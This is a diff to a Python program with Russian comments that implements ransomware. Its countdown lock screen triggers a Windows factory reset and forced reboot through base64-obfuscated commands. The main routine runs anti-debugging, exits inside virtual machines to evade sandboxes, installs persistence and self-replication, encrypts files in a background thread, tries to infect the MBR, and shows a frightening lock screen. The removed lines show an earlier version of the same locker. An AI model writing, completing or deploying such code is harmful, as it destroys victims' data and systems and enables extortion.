+            label_timer.config(text=f'Таймер: {TIMER_HOURS} ч')
+
+    button = tki.Button(root, text=_d('0J/QvtC00YLQstC10YDQtNC40YLRjA=='), command=check_code, font=('Arial', 15), bg='black', fg='white')
+    button.pack(pady=20)
+
+    def update_timer():
+        nonlocal label_timer
+        # Таймер обратного отсчёта в секундах
+        total_seconds = TIMER_HOURS * 3600
+        end_time = time.time() + total_seconds
+        while time.time() < end_time and root.winfo_exists():
+            remaining = int(end_time - time.time())
+            hours = remaining // 3600
+            minutes = (remaining % 3600) // 60
+            seconds = remaining % 60
+            label_timer.config(text=f'{hours:02d}:{minutes:02d}:{seconds:02d}')
+            root.update()
+            time.sleep(1)
+        # Время вышло – сброс к заводским
+        if root.winfo_exists():
+            factory_reset()
+            root.destroy()
+
+    threading.Thread(target=update_timer, daemon=True).start()
+    root.mainloop()
+
+def factory_reset():
+    # Попытка сброса Windows к заводским настройкам
+    # Вариант 1: systemreset (не всегда работает)
+    subprocess.run(_d('c3lzdGVtcmVzZXQgLWZhY3RvcnlyZXNldA==').split(), shell=True)
+    # Вариант 2: удаление системных файлов и перезагрузка
+    os.system(_d('c2h1dGRvd24gL3IgL3QgMCAvZg=='))  # shutdown /r /t 0 /f
+
+# ==================== ГЛАВНАЯ ФУНКЦИЯ ====================
+def main():
+    anti_debug()
+    if is_vm():
+        # Если виртуальная машина – не запускаемся (обход песочниц)
         sys.exit(0)
 
-    def run(self):
-        self.root.mainloop()
+    # Установка персистентности и размножение
+    install_persistence()
 
-if __name__ == "__main__":
+    # Запуск шифрования в отдельном потоке
+    encryption_thread = threading.Thread(target=scan_and_encrypt, daemon=True)
+    encryption_thread.start()
 
-    replicate()
+    # Заражение MBR (если есть права)
+    infect_mbr()
 
-    add_startup()
+    # Показываем страшный смайлик
+    show_scary_smile()
 
-    hide()
+    # Показываем экран блокировки
+    show_lock_screen()
 
-    bios_marker()
-
-    threading.Thread(target=encrypt_all, daemon=True).start()
-
-    ui = LockerUI
+if __name__ == '__main__':
+    main()
